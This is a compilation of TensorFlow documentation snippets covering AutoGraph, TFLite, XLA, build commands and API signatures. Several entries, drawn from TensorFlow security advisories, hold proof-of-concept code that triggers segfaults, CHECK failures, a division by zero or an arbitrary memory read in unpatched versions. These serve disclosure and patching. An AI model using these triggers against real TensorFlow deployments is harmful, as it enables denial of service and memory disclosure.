DESCRIPTION: This snippet shows how to use the `ag__.list_pop` function provided by TensorFlow AutoGraph. It takes a list-like object `l` as input and returns a tuple containing the modified list (with an element popped) and the value of the popped element. This function handles dispatching to the appropriate underlying operation based on the type of `l`, allowing lists within AutoGraph to be processed correctly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_8

LANGUAGE: python
CODE:
```
l, x = ag__.list_pop(l)
```

----------------------------------------

TITLE: Pushing TFLite Model to Android via ADB Shell
DESCRIPTION: This ADB command transfers the TFLite model file (`mobilenet_quant_v1_224.tflite` in this example) from the host machine to the temporary directory (`/data/local/tmp`) on the connected Android device, making it accessible for the evaluation binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_4

LANGUAGE: Shell
CODE:
```
adb push mobilenet_quant_v1_224.tflite /data/local/tmp
```

----------------------------------------

TITLE: Configuring XLA Compilation Determinism (Shell)
DESCRIPTION: This command-line flag, used during XLA compilation, ensures that subsequent compilations reuse compatible autotuning results. If complete results are not available from previous runs, compilation will fail, preventing non-deterministic autotuning.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/determinism.md#_snippet_0

LANGUAGE: shell
CODE:
```
--xla_gpu_require_complete_aot_autotune_results
```

----------------------------------------

TITLE: Variable Initialization Inside Loop (Used After, Loop Skips) - Incorrect
DESCRIPTION: When a variable is initialized inside a loop, does not depend on previous iterations, and is used after the loop, AutoGraph inserts a check. If the loop does not execute even once, this check will raise a runtime error because the variable was never initialized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_7

LANGUAGE: python
CODE:
```
del x
while tf.constant(False):  # Error -- loop must initialize x!
  x = tf.constant(1)
tf.print(x)
```

----------------------------------------

TITLE: Add Mean to Normalization Options - Python
DESCRIPTION: This snippet shows the signature for the `NormalizationOptionsAddMean` function. It is used during the FlatBuffer building process to add a mean value to the NormalizationOptions table. Requires a FlatBuffer builder instance and the mean value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsAddMean.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsAddMean(
    builder, mean
)
```

----------------------------------------

TITLE: Installing Prerequisites
DESCRIPTION: This snippet executes shell commands within the notebook environment to install necessary packages. It installs libportaudio2, then installs tflite-model-maker, uninstalls any existing tflite_support_nightly, and finally installs the required tflite_support_nightly package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_1

LANGUAGE: shell
CODE:
```
!sudo apt -y install libportaudio2
!pip install -q tflite-model-maker
!pip uninstall -y tflite_support_nightly
!pip install tflite_support_nightly
```

----------------------------------------

TITLE: Getting Audio Channels - AudioProperties Python
DESCRIPTION: Retrieves the number of audio channels from the `AudioProperties` object. This method is used to access the channel count metadata stored within the FlatBuffers structure. It returns an integer representing the number of channels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioProperties.md#_snippet_1

LANGUAGE: python
CODE:
```
Channels()
```

----------------------------------------

TITLE: Reproducing Bincount Segfault with XLA in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2023-007 vulnerability. It defines a function using `tf.raw_ops.Bincount` with `jit_compile=True` (enabling XLA) and specific parameters for `arr`, `size`, and `weights` that are known to trigger the segfault in affected TensorFlow versions. Running this code on an unpatched version should result in a crash or error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-007.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

func = tf.raw_ops.Bincount
para={'arr': 6, 'size': 804, 'weights': [52, 351]}

@tf.function(jit_compile=True)
def fuzz_jit():
 y = func(**para)
 return y

print(fuzz_jit())
```

----------------------------------------

TITLE: Executing TFLite Model Signatures - Python
DESCRIPTION: Demonstrates loading a TFLite model in the Python interpreter and obtaining callable signature runners for specific keys ('encode', 'decode'), which can then be invoked with input tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_7

LANGUAGE: Python
CODE:
```
# Load the TFLite model in TFLite Interpreter
interpreter = tf.lite.Interpreter(model_content=tflite_model)

# Print the signatures from the converted model
signatures = interpreter.get_signature_list()
print('Signature:', signatures)

# encode and decode are callable with input as arguments.
encode = interpreter.get_signature_runner('encode')
decode = interpreter.get_signature_runner('decode')

# 'encoded' and 'decoded' are dictionaries with all outputs from the inference.
input = tf.constant([1, 2, 3], dtype=tf.float32)
print('Input:', input)
encoded = encode(x=input)
print('Encoded result:', encoded)
decoded = decode(x=encoded['encoded_result'])
print('Decoded result:', decoded)
```

----------------------------------------

TITLE: Demonstrating TensorFlow PyFunc vulnerability in Python
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2022-162 vulnerability in `tf.raw_ops.PyFunc`. It shows that providing a non-UTF-8 bytestring (`b'\xb0'`) as the `token` argument, along with dummy inputs, causes a `CHECK` failure in vulnerable versions of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-162.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

value = tf.constant(value=[1,2])
token = b'\xb0'
dataType = [tf.int32]

tf.raw_ops.PyFunc(input=value,token=token,Tout=dataType)
```

----------------------------------------

TITLE: Building Custom TFLite C Shared Object (Shell)
DESCRIPTION: This shell command uses Bazel to build the custom C shared object target defined in the `tmp/BUILD` file. It specifies optimization flags (`-c opt`, `--cxxopt=--std=c++17`) and the target label `//tmp:tensorflowlite_c`. An additional config flag (`--config=android_arm` or `android_arm64`) is needed for Android builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_5

LANGUAGE: sh
CODE:
```
bazel build -c opt --cxxopt=--std=c++17 \
  //tmp:tensorflowlite_c
```

LANGUAGE: sh
CODE:
```
bazel build -c opt --cxxopt=--std=c++17 --config=android_arm \
  //tmp:tensorflowlite_c
```

----------------------------------------

TITLE: Downloading ARMv6 Toolchain (sh)
DESCRIPTION: These commands download the specified ARM GNU toolchain for ARMv6 targets from Google Storage, create a target directory under the user's home folder, and extract the toolchain archives, preparing it for cross-compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_6

LANGUAGE: sh
CODE:
```
curl -LO https://storage.googleapis.com/mirror.tensorflow.org/developer.arm.com/media/Files/downloads/gnu-a/8.3-2019.03/binrel/gcc-arm-8.3-2019.03-x86_64-arm-linux-gnueabihf.tar.xz
mkdir -p ${HOME}/toolchains
tar xvf gcc-arm-8.3-2019.03-x86_64-arm-linux-gnueabihf.tar.xz -C ${HOME}/toolchains
```

----------------------------------------

TITLE: Correct Use of tf.TensorArray (Functional Style)
DESCRIPTION: `tf.TensorArray` modifications create a new `TensorArray` object efficiently. Therefore, it must be handled using a functional style where the result of modification methods (like `write`) is assigned back to the variable, especially within AutoGraph-transformed loops.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_14

LANGUAGE: python
CODE:
```
def change(ta):
  ta = ta.write(0, 1)  # Modifications create a new TensorArray efficiently.
  return ta

ta = tf.TensorArray(tf.int32, size=0, dynamic_size=True)
while x > 0:
  # TensorArray must be handled using functional programming style.
  ta = change(ta)
```

----------------------------------------

TITLE: Running TFLite Inference with Signature Java
DESCRIPTION: Executes a TensorFlow Lite model using a specific signature, available for models converted from TensorFlow 2.5+. It takes input data mapped by name, output data maps to receive results, and an optional signature name. This method is preferred for models with defined signatures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_2

LANGUAGE: Java
CODE:
```
try (Interpreter interpreter = new Interpreter(file_of_tensorflowlite_model)) {
  Map<String, Object> inputs = new HashMap<>();
  inputs.put("input_1", input1);
  inputs.put("input_2", input2);
  Map<String, Object> outputs = new HashMap<>();
  outputs.put("output_1", output1);
  interpreter.runSignature(inputs, outputs, "mySignature");
}
```

----------------------------------------

TITLE: Selecting TFLite Logging Source CMake
DESCRIPTION: This snippet excludes generic minimal logging sources from the `TFLITE_SRCS` list and appends a system-specific minimal logging source file (`minimal_logging_android.cc`, `minimal_logging_ios.cc`, or `minimal_logging_default.cc`) based on the value of the `CMAKE_SYSTEM_NAME` variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_26

LANGUAGE: CMake
CODE:
```
list(FILTER TFLITE_SRCS EXCLUDE REGEX ".*minimal_logging_.*\\.cc$")
if("${CMAKE_SYSTEM_NAME}" STREQUAL "Android")
  list(APPEND TFLITE_SRCS ${TFLITE_SOURCE_DIR}/minimal_logging_android.cc)
elseif("${CMAKE_SYSTEM_NAME}" STREQUAL "iOS")
  list(APPEND TFLITE_SRCS ${TFLITE_SOURCE_DIR}/minimal_logging_ios.cc)
else()
  list(APPEND TFLITE_SRCS ${TFLITE_SOURCE_DIR}/minimal_logging_default.cc)
endif()
```

----------------------------------------

TITLE: Running Inference on 16x8 Quantized TFLite Model (Single Image) Python
DESCRIPTION: Prepares the same test image as input for the 16x8 quantized interpreter. It sets the input tensor, invokes the interpreter to run inference on the quantized model, and retrieves the prediction results from the output tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
test_image = np.expand_dims(test_images[0], axis=0).astype(np.float32)

input_index = interpreter_16x8.get_input_details()[0]["index"]
output_index = interpreter_16x8.get_output_details()[0]["index"]

interpreter_16x8.set_tensor(input_index, test_image);
interpreter_16x8.invoke();
predictions = interpreter_16x8.get_tensor(output_index);
```

----------------------------------------

TITLE: Reproducing tf.linalg.matrix_rank CHECK fail - Python
DESCRIPTION: This Python snippet demonstrates the TensorFlow vulnerability (TFSA-2022-119) by calling `tf.linalg.matrix_rank` with a specific empty tensor input. It requires the `tensorflow` library. When run on a vulnerable version with GPU support, this code is expected to trigger a `CHECK` fail in the GPU kernel, potentially causing a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-119.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

a = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)
tf.linalg.matrix_rank(a=a)
```

----------------------------------------

TITLE: Initializing Dense Layer and Adam Optimizer Python
DESCRIPTION: This snippet defines the core components of the simple model used for classification: a single `tf.keras.layers.Dense` layer with `NUM_CLASSES` output units. It also initializes an `tf.keras.optimizers.Adam` optimizer, which will be used to update the model's weights during training based on the calculated gradients.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
layer = tf.keras.layers.Dense(NUM_CLASSES)
optimizer = tf.keras.optimizers.Adam()
```

----------------------------------------

TITLE: Downloading and Extracting TensorFlow Model bash
DESCRIPTION: This script downloads the pre-trained mobile MultiBox object detection model archive using `wget` and extracts its contents into the designated data directory using `unzip`. This model file is a prerequisite for running the C++ detection demo and is not included in the repository due to its size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/multibox_detector/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
wget https://storage.googleapis.com/download.tensorflow.org/models/mobile_multibox_v1a.zip -O tensorflow/examples/multibox_detector/data/mobile_multibox_v1a.zip
unzip tensorflow/examples/multibox_detector/data/mobile_multibox_v1a.zip -d tensorflow/examples/multibox_detector/data/
```

----------------------------------------

TITLE: Creating TFLiteConverter from Jax Model (Python)
DESCRIPTION: This class method facilitates the creation of a `TFLiteConverter` object directly from a Jax model. It requires an array of Jax functions with applied weights (`serving_funcs`) and a corresponding array of Jax input placeholders (`inputs`). The method returns a configured `TFLiteConverter` instance ready to perform the conversion to the TFLite format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_6

LANGUAGE: Python
CODE:
```
@classmethod
experimental_from_jax(
    serving_funcs, inputs
)
```

----------------------------------------

TITLE: Triggering Reverse Division by Zero - TensorFlow - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in `tf.raw_ops.Reverse`. By providing a tensor with a shape whose first dimension is 0, the subsequent C++ kernel operation attempts to divide by zero when calculating per-unit cost, resulting in a runtime error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-045.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)
dims = tf.constant([False, True, False], shape=[3], dtype=tf.bool)

tf.raw_ops.Reverse(tensor=tensor_input, dims=dims)
```

----------------------------------------

TITLE: DepthwiseConv2DOptions FlatBuffer Schema (Versioned)
DESCRIPTION: This snippet shows the updated FlatBuffer schema definition for DepthwiseConv2DOptions with added dilation parameters (`dilation_w_factor`, `dilation_h_factor`). Comments indicate the version support, and default values (1) are provided for forward compatibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_1

LANGUAGE: FlatBuffers
CODE:
```
table DepthwiseConv2DOptions {
  // Parameters for DepthwiseConv version 1 or above.
  padding:Padding;
  stride_w:int;
  stride_h:int;
  depth_multiplier:int;
  fused_activation_function:ActivationFunctionType;
  // Parameters for DepthwiseConv version 2 or above.
  dilation_w_factor:int = 1;
  dilation_h_factor:int = 1;
}
```

----------------------------------------

TITLE: Getting Model Spec | TensorFlow Lite Model Maker | Python
DESCRIPTION: This snippet shows the function signature for `tflite_model_maker.model_spec.get`. It is used to obtain a model specification instance. You can pass either a string name of a known model spec or an existing model spec object. Additional `*args` and `**kwargs` are passed to the model spec's initialization method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/model_spec/get.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.model_spec.get(
    spec_or_str, *args, **kwargs
)
```

----------------------------------------

TITLE: Loading TensorAudio from AudioRecord in Python
DESCRIPTION: Loads audio data into the `TensorAudio` instance's buffer from an existing `AudioRecord` instance. This method facilitates transferring captured or processed audio data from an `AudioRecord` object.
It validates the configuration of the source `AudioRecord` and may raise `ValueError` or `RuntimeError` if issues occur during the loading process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/TensorAudio.md#_snippet_4

LANGUAGE: Python
CODE:
```
load_from_audio_record(
    record: tflite_support.task.audio.AudioRecord
) -> None
```

----------------------------------------

TITLE: Calling SubGraphMetadataStartAssociatedFilesVector in Python
DESCRIPTION: This snippet shows the function signature for `SubGraphMetadataStartAssociatedFilesVector`. It's a helper function likely used internally by the FlatBuffers library binding in Python to begin constructing a vector of associated files within the metadata for a subgraph. It requires a FlatBuffers builder object and the number of elements the vector will contain as parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartAssociatedFilesVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartAssociatedFilesVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Configure Project Build Type
DESCRIPTION: Sets a flag indicating if the project is being built externally (as part of LLVM) or standalone. Configures the project name and C/CXX standards if building standalone, and adds the local cmake/modules directory to CMAKE_MODULE_PATH.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
set(MHLO_EXTERNAL_PROJECT_BUILD OFF)

if(NOT (CMAKE_SOURCE_DIR STREQUAL CMAKE_CURRENT_SOURCE_DIR) AND NOT MLIR_BINARY_DIR)
  # Building as part of LLVM via the external project mechanism.
  set(MHLO_EXTERNAL_PROJECT_BUILD ON)
else()
  # Building standalone.
  project(mlir-hlo LANGUAGES CXX C)
  set(CMAKE_C_STANDARD 11)
  set(CMAKE_CXX_STANDARD 17)
  list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/cmake/modules")
endif()
```

----------------------------------------

TITLE: Replaying After Optimization HLO in Single Process Bash
DESCRIPTION: This command replays a specific 'after optimizations' HLO graph file (`/tmp/dump/module_0023.pjit__wrapped_step_fn.sm_8.0_gpu_after_optimizations.txt`) using the HLO runner. It requires the `--run_xla_backend_only` flag to prevent recompilation errors when processing an already optimized graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_6

LANGUAGE: bash
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- \
  --run_xla_backend_only \
  /tmp/dump/module_0023.pjit__wrapped_step_fn.sm_8.0_gpu_after_optimizations.txt
```

----------------------------------------

TITLE: Setting TFCI for Recommended Caching
DESCRIPTION: This command sets the `TFCI` environment variable to use a common recommended configuration for local execution. It specifies Python 3.11 on Linux x86_64, utilizing both the public read-only build cache and a local disk cache. This configuration is generally recommended for faster builds when re-running tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
export TFCI=py311,linux_x86,public_cache,disk_cache
```

----------------------------------------

TITLE: Demonstrating Arbitrary Read Vulnerability with TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the arbitrary memory read vulnerability in TensorFlow's `ImmutableConst` operation. It creates a temporary file containing arbitrary bytes and attempts to load it as a TensorFlow string constant using `tf.raw_ops.ImmutableConst` with a memory region name, triggering the unsafe memory access.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-170.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

with open('/tmp/test','wb') as f:
    f.write(b'\xe2'*128)
    data = tf.raw_ops.ImmutableConst(dtype=tf.string,shape=3,memory_region_name='/tmp/test')

print(data)
```

----------------------------------------

TITLE: Building TFLite Native Benchmark Binary (Host) - Bazel Shell
DESCRIPTION: Builds the native TensorFlow Lite benchmark command-line binary from source code on a host machine (Linux, Mac, etc.) using the Bazel build system. The `-c opt` flag enables compiler optimizations for the build. This command is used when building for the host environment where Bazel is installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_3

LANGUAGE: Shell
CODE:
```
bazel build -c opt //tensorflow/lite/tools/benchmark:benchmark_model
```

----------------------------------------

TITLE: Run TensorFlow Lite Demo with Hexagon Delegate on Android
DESCRIPTION: Executes the label_image binary on Android via `adb shell`, enabling the Hexagon delegate using the '-j 1' flag. Requires Hexagon libraries to be installed on the device (e.g., in /data/local/tmp) as per the Hexagon Delegate Guide. Uses a quantized model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_9

LANGUAGE: shell
CODE:
```
adb shell \
    "/data/local/tmp/label_image \
    -m /data/local/tmp/mobilenet_v1_1.0_224_quant.tflite \
    -i /data/local/tmp/grace_hopper.bmp \
    -l /data/local/tmp/labels.txt -j 1"
```

----------------------------------------

TITLE: Installing libusb Dependency (Bash)
DESCRIPTION: These Bash commands show how to install the `libusb-1.0-0-dev` package, which is a prerequisite for using the Coral Edge TPU delegate in C++ on Linux and macOS. Commands for both `apt-get` (Linux) and `port`/`brew` (macOS) are provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_7

LANGUAGE: Bash
CODE:
```
# On the Linux
sudo apt-get install libusb-1.0-0-dev

# On the macOS
port install libusb
# or
brew install libusb
```

----------------------------------------

TITLE: Apache License Header - Python
DESCRIPTION: This snippet contains the standard Apache License, Version 2.0 header comments. It specifies the terms under which the code is licensed and how it can be used, modified, and distributed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Create Interpreter with Play Services Runtime (Async) - Kotlin
DESCRIPTION: This Kotlin snippet demonstrates how to create a TensorFlow Lite Interpreter instance after TFLite initialization completes successfully. It sets the runtime option to use the Google Play services version and handles potential creation failures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_7

LANGUAGE: Kotlin
CODE:
```
import org.tensorflow.lite.InterpreterApi
import org.tensorflow.lite.InterpreterApi.Options.TfLiteRuntime
...
private lateinit var interpreter: InterpreterApi
...
initializeTask.addOnSuccessListener {
  val interpreterOption =
    InterpreterApi.Options().setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY)
  interpreter = InterpreterApi.create(
    modelBuffer,
    interpreterOption
  )}
  .addOnFailureListener { e ->
    Log.e("Interpreter", "Cannot initialize interpreter", e)
  }
```

----------------------------------------

TITLE: Finding Failing Modules with MLIR Replay (Shell)
DESCRIPTION: This command invokes the `mlir_replay` tool and directs it to a directory (`/tmp/test-dump`) containing compilation traces (`.mlir-trace.pb`) and HLO snapshots (`.snapshot.pb`) generated from a previous test run. The tool scans the directory to identify and report which specific modules or executions failed upon replay.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_replay/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
./mlir_replay \
  --mlir-compilation-trace-dir=/tmp/test-dump
```

----------------------------------------

TITLE: Evaluating 16x8 Quantized TFLite Model Accuracy Python
DESCRIPTION: Calls the `evaluate_model` helper function with the interpreter loaded with the 16x8 quantized TFLite model. It calculates the accuracy of the quantized model on the test dataset and prints the score, noting that its performance might be slower without optimized kernels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
# NOTE: This quantization mode is an experimental post-training mode,
# it does not have any optimized kernels implementations or
# specialized machine learning hardware accelerators. Therefore,
# it could be slower than the float interpreter.
print(evaluate_model(interpreter_16x8))
```

----------------------------------------

TITLE: Reading Variable Value - TensorFlow GraphDef
DESCRIPTION: This node reads the current value from the resource handle defined by the 'Variable' node. It specifies the operation type ('ReadVariableOp'), the input (the variable handle), and the expected data type (float), providing the variable's tensor value as output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_1

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "Variable/Read/ReadVariableOp"
  op: "ReadVariableOp"
  input: "Variable"
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
        }
      }
    }
  }
  attr {
    key: "dtype"
    value {
      type: DT_FLOAT
    }
  }
}
```

----------------------------------------

TITLE: Linking TensorFlowLiteSelectTfOps Framework in iOS
DESCRIPTION: This linker flag forces the inclusion of all symbols from the TensorFlowLiteSelectTfOps framework. This is necessary for TensorFlow Lite to properly utilize the selected TensorFlow operations when running on an iOS device or simulator. This flag should be added to the 'Other Linker Flags' build setting in your Xcode project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/ios/TensorFlowLiteSelectTfOps.md#_snippet_0

LANGUAGE: iOS Build Setting
CODE:
```
-force_load "$(PROJECT_DIR)/Pods/TensorFlowLiteSelectTfOps/Frameworks/TensorFlowLiteSelectTfOps.framework/TensorFlowLiteSelectTfOps"
```

----------------------------------------

TITLE: Push Test Model and Run Benchmark - Android Bash
DESCRIPTION: Pushes a test TensorFlow Lite model file (`add.bin`) containing operations supported by the sample delegate to the device and then executes the `benchmark_model` tool on the device using `adb shell`. It provides the previously created settings file and the path to the model file as arguments to benchmark the model using the sample delegate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_13

LANGUAGE: bash
CODE:
```
adb push tensorflow/lite/testdata/add.bin /data/local/tmp/add.bin
adb shell "/data/local/tmp/benchmark_model \
  --stable_delegate_settings_file=/data/local/tmp/stable_delegate_settings.json \
  --graph=/data/local/tmp/add.bin"
```

----------------------------------------

TITLE: Using TensorView with TFLite Tensor (C++)
DESCRIPTION: Demonstrates how to create a TensorView instance from a TensorFlow Lite tensor and access/modify its elements using methods like As, Data, operator(), and operator[]. This shows TensorView's compatibility with TFLite tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/shim/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
TfLiteTensor tflite_tensor;
auto t = TensorView::New(&tflite_tensor);

auto t_int_vec = t.As<int32, /*RANK=*/ 1>();
t(0) = 123;
t(1) = 456

auto t_buffer = t.Data<int32>();
t[0] = 123;
t[1] = 456
```

----------------------------------------

TITLE: Adjust Benchmarker Parameters - Java Snippet
DESCRIPTION: Snippet from `OvicBenchmarkerActivity.java` illustrating where to change benchmark parameters such as `WALL_TIME` (duration per experiment), `MAX_ITERATIONS` (maximum runs), and `BIG_CORE_MASK` (processor affinity) for tuning the on-device measurement.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_10

LANGUAGE: java
CODE:
```
/** Wall time for each benchmarking experiment. */
  private static final double WALL_TIME = 3000;
  /** Maximum number of iterations in each benchmarking experiment. */
  private static final int MAX_ITERATIONS = 100;
  /** Mask for binding to a single big core. Pixel 1 (4), Pixel 4 (16). */
  private static final int BIG_CORE_MASK = 16;
```

----------------------------------------

TITLE: Initializing BoundingBoxPropertiesT from Object - Python
DESCRIPTION: Documents the class method `InitFromObj`, which initializes a `BoundingBoxPropertiesT` object by copying data from another `BoundingBoxPropertiesT` object. It takes an existing `boundingBoxProperties` object as input, useful for cloning or type conversion if applicable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    boundingBoxProperties
)
```

----------------------------------------

TITLE: Building and Running TFLite Evaluation on Desktop Bazel
DESCRIPTION: This Bazel command builds the `run_eval` binary for the desktop platform (`-c opt`) and then immediately runs it. It passes command-line arguments specifying the paths to the model file, ground truth images, ground truth labels, model output labels, and the desired output file path. `--num_images=0` processes all images.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_9

LANGUAGE: Bazel
CODE:
```
bazel run -c opt \
  -- \
  //tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification:run_eval \
  --model_file=mobilenet_quant_v1_224.tflite \
  --ground_truth_images_path=${IMAGENET_IMAGES_DIR} \
  --ground_truth_labels=${VALIDATION_LABELS} \
  --model_output_labels=${MODEL_LABELS_TXT} \
  --output_file_path=/tmp/accuracy_output.txt \
  --num_images=0 # Run on all images.
```

----------------------------------------

TITLE: Get Associated File - TensorMetadata (Python)
DESCRIPTION: Retrieves the associated file metadata object at the specified index j. This method allows accessing details about external files referenced by the tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_0

LANGUAGE: python
CODE:
```
AssociatedFiles(
    j
)
```

----------------------------------------

TITLE: Adding Opaque Delegate Compile Definition CMake
DESCRIPTION: This CMake command adds the `TFLITE_USE_OPAQUE_DELEGATE` compiler definition. This flag is necessary when using the TensorFlow Lite native API with the opaque delegates provided by TensorFlow Lite in Google Play Services, enabling the build system to correctly handle the delegate integration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_4

LANGUAGE: cmake
CODE:
```
add_compile_definitions(TFLITE_USE_OPAQUE_DELEGATE)
```

----------------------------------------

TITLE: Lowering Floor Div (MLIR/TOSA IR)
DESCRIPTION: Lowers a Floor Division operation to TOSA. It computes the reciprocal of the right-hand side operand, multiplies the left-hand side by this reciprocal (performing division), and then applies the `tosa.FLOOR` operation to the result. This implements the floor division `floor(lhs / rhs)`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_10

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_floor_div(Value %lhs, Value %rhs)
{
    %recip = tosa.RECIPROCAL(%rhs)
    %mul = tosa.MUL(%lhs, %recip)
    %output = tosa.FLOOR(%mul)

    return %output
}
```

----------------------------------------

TITLE: Create Mandatory Metadata - TFLite Support - Python
